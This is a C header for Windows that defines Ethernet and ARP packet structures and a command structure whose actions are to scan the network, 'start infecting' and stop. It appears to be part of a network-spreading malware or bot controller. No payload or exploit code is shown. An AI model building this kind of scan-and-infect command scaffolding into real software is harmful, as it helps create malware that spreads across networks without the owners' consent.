#pragma once

#include <Windows.h>
#include <stdint.h>

#define ACTS_NUM 2 //scan, infect
#define ETH_P_ARP 0x0806 /* Address Resolution packet */
#define ARP_HTYPE_ETHER 1  /* Ethernet ARP type */
#define ARP_PTYPE_IPv4 0x0800 /* Internet Protocol packet */
#define ETH_ALEN 6 /* MAC Address bytes size*/
#define MAX_HOSTS 100

#pragma pack(1)

/* Ethernet frame header */
typedef struct {
    uint8_t dest_addr[ETH_ALEN]; /* Destination hardware address */
    uint8_t src_addr[ETH_ALEN];  /* Source hardware address */
    uint16_t frame_type;   /* Ethernet frame type */
} ether_hdr;

/* Ethernet ARP packet from RFC 826 */
typedef struct {
    uint16_t htype;   /* Format of hardware address */
    uint16_t ptype;   /* Format of protocol address */
    uint8_t hlen;    /* Length of hardware address */
    uint8_t plen;    /* Length of protocol address */
    uint16_t op;    /* ARP opcode (command) */
    uint8_t sha[ETH_ALEN];  /* Sender hardware address */
    uint32_t spa;   /* Sender IP address */
    uint8_t tha[ETH_ALEN];  /* Target hardware address */
    uint32_t tpa;   /* Target IP address */
} arp_ether_ipv4;

enum ACTS
{
	SCAN, //start scanning the net
	INFECT, //start infecting
	STOP_I, //stop infecting
	STOP_S, //stop scanning
	STOP_A //stop all
};

typedef struct command
{
	BYTE act;
	ULONG32 ip_addr; 
	ULONG32 netmask;
	//etc...
} *pCommand;


void execute_command(pCommand command);